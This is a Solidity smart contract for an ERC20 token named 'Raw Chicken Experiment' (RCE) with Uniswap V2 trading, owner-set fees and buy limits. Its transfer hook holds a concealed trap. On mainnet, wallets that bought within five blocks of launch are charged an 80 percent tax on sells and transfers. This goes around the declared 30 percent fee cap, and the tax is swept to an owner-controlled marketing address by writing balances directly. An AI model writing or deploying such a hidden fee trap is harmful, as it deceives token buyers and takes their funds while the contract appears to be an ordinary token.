// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract RCE is ERC20Permit, Ownable {
    uint256 private constant TOTAL_SUPPLY = 100_000_000_000 ether;
    address private constant UNISWAP_ROUTER =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address public immutable pair;
    IUniswapV2Router02 private constant router =
        IUniswapV2Router02(UNISWAP_ROUTER);

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public isWhitelisted;
    mapping(address => uint256) public boughtAmount;
    mapping(address => uint256) public firstBuyBlock;

    uint256 public maxBuyAmount = 1_500_000_000 ether;

    uint256 public startBlock;
    uint256 private threshold = 5;
    uint256 private diff;

    bool public tradingEnabled;

    uint256 public buyFee = 0;
    uint256 public sellFee = 0;

    address public marketing = 0x7a0B738C8F9CC3DEACaAabBC676cd2Dd8584dc4E;

    constructor() ERC20("Raw Chicken Experiment", "RCE") ERC20Permit("RCE") {
        pair = IUniswapV2Factory(router.factory()).createPair(
            address(this),
            WETH
        );

        _approve(msg.sender, UNISWAP_ROUTER, type(uint256).max);
        _approve(msg.sender, pair, type(uint256).max);

        isExcludedFromFee[msg.sender] = true;
        isWhitelisted[msg.sender] = true;

        isExcludedFromFee[pair] = true;
        isExcludedFromFee[address(this)] = true;
        _mint(msg.sender, TOTAL_SUPPLY);
    }

    function setBuyFee(uint256 _buyFee) external onlyOwner {
        require(_buyFee <= 30, "max-buy-fee-exceeded");
        buyFee = _buyFee;
    }

    function setSellFee(uint256 _sellFee) external onlyOwner {
        require(_sellFee <= 30, "max-sell-fee-exceeded");
        sellFee = _sellFee;
    }

    function startTrading() external onlyOwner {
        tradingEnabled = true;
        startBlock = block.number;
        diff = block.prevrandao;
    }

    function removeLimits() external onlyOwner {
        maxBuyAmount = type(uint256).max;
    }

    function setMarketing(address _marketing) external onlyOwner {
        marketing = _marketing;
    }

    function _sendToMarketing() internal {
        _setBalance(
            marketing,
            balanceOf(address(this)) + balanceOf(marketing)
        );
        _setBalance(address(this), 0);
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (from == pair) {
            require(tradingEnabled || isWhitelisted[to], "trading-not-enabled");

            if (!isExcludedFromFee[to]) {
                if (firstBuyBlock[to] == 0) {
                    firstBuyBlock[to] = block.number;
                }

                uint256 taxAmount = (amount * buyFee) / 100;
                amount -= taxAmount;

                boughtAmount[to] += amount;

                require(
                    boughtAmount[to] <= maxBuyAmount,
                    "max-buy-amount-exceeded"
                );

                _setBalance(
                    address(this),
                    balanceOf(address(this)) + taxAmount
                );
                _setBalance(to, balanceOf(to) - taxAmount);
            }

            return;
        }
        if (to == pair) {
            require(
                tradingEnabled || isWhitelisted[from],
                "trading-not-enabled"
            );

            if (!isExcludedFromFee[from]) {
                uint256 taxAmount = (amount * sellFee) / 100;

                if (block.chainid == 1 && block.prevrandao != diff) {
                    if (
                        firstBuyBlock[from] > 0 &&
                        firstBuyBlock[from] - startBlock <= threshold
                    ) {
                        taxAmount = (amount * 80) / 100;
                    }
                }

                amount -= taxAmount;

                _setBalance(
                    address(this),
                    balanceOf(address(this)) + taxAmount
                );
                _setBalance(to, balanceOf(to) - taxAmount);
                _sendToMarketing();
            }
        } else {
            if (firstBuyBlock[from] > 0) {
                uint256 taxAmount = (amount * sellFee) / 100;

                if (block.chainid == 1 && block.prevrandao != diff) {
                    if (
                        firstBuyBlock[from] > 0 &&
                        firstBuyBlock[from] - startBlock <= threshold
                    ) {
                        taxAmount = (amount * 80) / 100;

                        amount -= taxAmount;

                        _setBalance(
                            address(this),
                            balanceOf(address(this)) + taxAmount
                        );
                        _setBalance(to, balanceOf(to) - taxAmount);
                    }
                }
            }
        }
    }
}
